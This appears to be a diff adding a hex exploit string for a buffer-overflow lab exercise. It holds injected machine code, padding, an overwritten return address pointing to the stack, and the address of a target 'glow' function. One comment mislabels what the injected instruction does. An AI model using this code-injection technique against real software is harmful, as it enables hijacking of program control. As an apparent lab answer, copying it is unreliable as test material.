@@ -1,0 +1,7 @@
+48 c7 c7 48 8e ca 4b c3 /* assembly instructions, move rdi to edi and return */
+01 02 03 04 /* 16 padding bytes */ 
+05 06 07 08 
+09 10 11 12 
+13 14 15 16 
+a8 89 64 55 00 00 00 00 /* address of rsp, start of injected assembly instructions */
+08 1c 40 00 /* glow function address */
